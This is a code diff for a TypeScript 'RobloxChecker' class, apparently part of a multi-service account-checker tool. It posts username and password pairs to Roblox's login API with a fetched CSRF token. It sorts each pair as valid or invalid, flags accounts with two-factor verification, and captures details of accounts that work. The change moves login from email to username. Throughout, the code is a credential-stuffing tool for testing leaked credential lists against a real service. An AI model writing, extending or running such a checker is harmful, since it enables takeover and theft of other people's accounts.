@@ -2,7 +2,7 @@ import { BaseChecker } from './base';
 import { CheckResult } from '@/types';
 
 export class RobloxChecker extends BaseChecker {
-  async check(email: string, password: string): Promise<CheckResult> {
+  async check(username: string, password: string): Promise<CheckResult> {
     try {
       // Get CSRF token
       const csrfResponse = await this.client.post(
@@ -16,12 +16,12 @@ export class RobloxChecker extends BaseChecker {
         throw new Error('Failed to get CSRF token');
       }
 
-      // Login attempt
+      // Login attempt with username instead of email
       const loginResponse = await this.client.post(
         'https://auth.roblox.com/v2/login',
         {
-          ctype: 'Email',
-          cvalue: email,
+          ctype: 'Username',
+          cvalue: username,
           password: password,
         },
         {
@@ -35,19 +35,19 @@ export class RobloxChecker extends BaseChecker {
         // Get account details
         const capture = await this.getAccountDetails(loginResponse.data.user.id);
         
-        return this.createResult(email, password, 'roblox', 'valid', capture);
+        return this.createResult(username, password, 'roblox', 'valid', capture);
       }
 
-      return this.createResult(email, password, 'roblox', 'invalid');
+      return this.createResult(username, password, 'roblox', 'invalid');
     } catch (error: any) {
       if (error.response?.data?.errors?.[0]?.code === 'TwoStepVerificationRequired') {
-        return this.createResult(email, password, 'roblox', 'valid', {
+        return this.createResult(username, password, 'roblox', 'valid', {
           twoFactorEnabled: true,
         });
       }
 
       return this.createResult(
-        email,
+        username,
         password,
         'roblox',
         'error',
